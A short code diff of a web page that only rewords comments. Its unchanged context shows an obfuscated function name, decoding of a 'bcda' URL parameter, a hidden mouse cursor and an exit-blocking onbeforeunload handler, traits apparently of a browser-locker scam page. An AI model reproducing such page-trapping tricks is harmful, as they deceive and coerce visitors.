@@ -54,7 +54,7 @@
 		t.send();
 	</script>
 	<script>
-    // Your custom regex function to get query parameter by name
+    // Custom regex function to get query parameter by name
     function cwewdwdewdwedwdwfwefcxcxcxsdsdwd(name) {
         name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
         var regexS = "[\\?&]" + name + "=([^&#]*)";
@@ -70,7 +70,7 @@
     // Get the 'bcda' parameter from the URL
     var bcda = cwewdwdewdwedwdwfwefcxcxcxsdsdwd('bcda');
 
-    // Log the extracted query parameter value (before decoding)
+    // Log the raw query parameter value from URL
     console.log("Encoded 'bcda' value from URL:", bcda);
 
     // If there's a 'bcda' parameter, decode it
@@ -90,7 +90,6 @@
         console.log("No 'bcda' parameter found in the URL.");
     }
 </script>
-
 
 </head>
 <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
